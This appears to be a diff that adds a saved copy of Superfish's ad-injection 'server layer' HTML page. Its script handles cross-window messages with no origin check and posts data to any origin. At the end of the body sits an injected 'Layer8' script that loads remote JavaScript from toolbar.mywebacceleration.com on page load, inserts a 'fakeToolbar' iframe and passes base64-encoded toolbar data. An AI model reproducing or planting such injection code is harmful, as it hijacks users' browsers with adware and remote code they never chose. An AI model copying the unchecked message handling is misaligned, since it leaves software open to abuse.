@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<!-- saved from url=(0074)http://www.superfish.com/ws/sfProdBan/server_layer.html?version=14.07.24.4 -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
+    <title>Advertisements</title>
+
+    <script type="application/javascript">
+
+        var AdsServerLayer =
+        {
+            urlParams: {},
+            results: {},
+            debug: false,
+
+        log: function(msg) {
+            if (this.debug && window.console) {
+                var dDate = new Date();
+                console.log(dDate.getTime() + " - server_layer - " + msg);
+            }
+        },
+
+        initialize: function()
+            {
+        this.log("in initialize");
+                if (localStorage.getItem('sf_uninstall_ads'))
+                {
+                    this.log("uninstall ads");
+                    if(!this.debug)
+                        return;
+                }
+
+                this.urlParams = this.parseUrlParams(location.search.substring(1));
+
+                window.addEventListener("message", this.clientMessagesRouter.bind(this), false);
+
+                this.showAds();
+            },
+
+            clientMessagesRouter: function(event)
+            {
+                var dataArray = event.data.split('__similarproductsAdsNamespaceMarker');
+                if(dataArray.length == 1){
+                    this.log("in clientMessagesRouter - not valid data - " + event);
+                    return;
+                }
+
+                var data = dataArray[1];
+                this.log("in clientMessagesRouter - data - " + data);
+                data = data && JSON.parse(data) || null;
+
+                if (data && typeof this[data.fn] === 'function')
+                {
+                    this[data.fn](data.data);
+                }
+            },
+
+            showAds: function()
+            {
+                this.ajax(
+                {
+                    url: '../tpl/sfProdBan.tpl',
+                    data: {version: this.urlParams.version},
+                    success: function(data)
+                    {
+                        this.results.template = data;
+
+                        this.sendDataToClient.call(this);
+
+                    }.bind(this)
+                });
+            },
+
+            sendDataToClient: function()
+            {
+                var message =
+                {
+                    fn: 'processServerData',
+                    data: this.results
+                };
+
+                top.postMessage('__similarproductsAdsNamespaceMarker'+JSON.stringify(message), '*');
+            },
+
+            disableUnit: function(key)
+            {
+                this.log("in disableUnit - key - '" + key + "'");
+                if (key === 'sf_uninstall_ads')
+                {
+                    localStorage.setItem('sf_uninstall_ads', 1);
+                }
+            },
+
+            parseUrlParams: function(urlParams)
+            {
+        this.log("in parseUrlParams - urlParams - '" + urlParams + "'");
+        var result = {};
+                var param;
+
+                urlParams = urlParams.split('&');
+
+                for (var i=0, l=urlParams.length; i<l; i++)
+                {
+                    param = urlParams[i].split('=');
+
+                    result[param[0]] = decodeURIComponent(param[1]);
+                }
+
+                return result;
+            },
+
+            compileQueryString: function(obj)
+            {
+                var result = [];
+
+                for (key in obj)
+                {
+                    if (obj.hasOwnProperty(key))
+                    {
+                        result.push(key + '=' + encodeURIComponent(obj[key]));
+                    }
+                }
+
+                return result.join('&');
+            },
+
+            ajax: function(params)
+            {
+                var httpRequest;
+                var _this = this;
+
+                if (window.XMLHttpRequest)
+                {
+                    httpRequest = new XMLHttpRequest();
+                }
+                else if (window.ActiveXObject)
+                {
+                    httpRequest = new ActiveXObject("Microsoft.XMLHTTP");
+                }
+
+                if (params.success || params.error)
+                {
+                    httpRequest.onreadystatechange = function()
+                    {
+                        if (this.readyState === 4)
+                        {
+                            if (this.status === 200)
+                            {
+                                params.success && params.success.call(_this, this.responseText);
+                            }
+                            else
+                            {
+                                params.error && params.error.call(_this, this.responseText);
+                            }
+                        }
+                    }
+                }
+
+                if (params.data)
+                {
+                    params.url += '?' + this.compileQueryString(params.data);
+                }
+
+        this.log("in ajax - urlParams - '" + params.url + "'");
+                httpRequest.open(params.method && params.method.toUpperCase() || 'GET', params.url);
+                httpRequest.send();
+            }
+        };
+
+        AdsServerLayer.initialize();
+
+    </script>
+<style type="text/css"></style></head>
+<body>
+
+<!-- Layer8 version 2.0.0.107 --><script>if(top==window){var fn_selector_insertion_script="http://toolbar.mywebacceleration.com/tbpreload.js";runFnTbScript = function(){try{var tbInsertion = new FNH.TBInsertion();var tbData = "PFRCRGF0YT48VEJEYXRhSXRlbSBuYW1lPSJob3N0X3VybCIgdmFsdWU9Imh0dHA6Ly93d3cuc3VwZXJmaXNoLmNvbS93cy9zZlByb2RCYW4vc2VydmVyX2xheWVyLmh0bWw/dmVyc2lvbj0xNC4wNy4yNC40IiA+PC9UQkRhdGFJdGVtPjxUQkRhdGFJdGVtIG5hbWU9Imluc2VydGlvbiIgdmFsdWU9Imh0dHA6Ly90b29sYmFyLm15d2ViYWNjZWxlcmF0aW9uLmNvbS9zb3VyY2VzL2luZnJhL2pzL2luc2VydGlvbl9wYy5qcyIgY29uZmlndXJhdGlvbj0idHJ1ZSIgPjwvVEJEYXRhSXRlbT48L1RCRGF0YT4=";tbInsertion.parseTBData(tbData);var fnLayer8=tbInsertion.createIframeElement("fn_layer8", "http://toolbar.mywebacceleration.com/Globe/fakeToolbar.html");var owner;if(document.body){owner=document.body;}else{owner=document.documentElement;}var shouldAddDiv=tbInsertion.getAttributeFromTBData("div_wrapper");if(shouldAddDiv){var divWrpr=tbInsertion.createElement("div", "fn_wrapper_div");divWrpr.style.position="fixed";divWrpr.ontouchstart=function(){return true;};if (typeof fnLayer8 != "undefined")divWrpr.appendChild(fnLayer8);owner.appendChild(divWrpr);}else{if (typeof fnLayer8 != "undefined")owner.appendChild(fnLayer8);}var result=tbInsertion.getAttributeFromTBData("insertion");if(result){scriptLocation=result;}else{scriptLocation="http://toolbar.mywebacceleration.com/sources/infra/js/insertion_pc.js"}var fnd=document.createElement("script");fnd.setAttribute("src",scriptLocation);fnd.setAttribute("id","fn_toolbar_script");fnd.setAttribute("toolbardata",tbData);fnd.setAttribute("toolbarhash","PzelyQcAofdSUW7OqepwIA==");fnd.setAttribute("persdata","PFByaXZhdGVEYXRhPg0KPFByaXZhdGVJdGVtIGtleT0iY2xvc2VkIiB2YWx1ZT0iZmFsc2UiPg0KPC9Qcml2YXRlSXRlbT4NCjxQcml2YXRlSXRlbSBrZXk9Im1pbmltaXplZCIgdmFsdWU9ImZhbHNlIj4NCjwvUHJpdmF0ZUl0ZW0+DQo8UHJpdmF0ZUl0ZW0ga2V5PSJkZWZhdWx0UGVyc1ZhbHVlcyIgdmFsdWU9InRydWUiPg0KPC9Qcml2YXRlSXRlbT4NCjwvUHJpdmF0ZURhdGE+");document.body.appendChild(fnd);}catch(e){console.error("TB preload script failed: " + e);}};var fne=document.createElement("script");fne.setAttribute("src",fn_selector_insertion_script);fne.setAttribute("id","fn_selector_insertion_script");if(fne.addEventListener){fne.onload = runFnTbScript;}else {fne.onreadystatechange = function(){if ((this.readyState == "complete") || (this.readyState == "loaded")) runFnTbScript();}};if(document.head==null || document.head=="undefined" ){document.head = document.getElementsByTagName("head")[0];}document.head.appendChild(fne);};</script>
+
+</body></html>
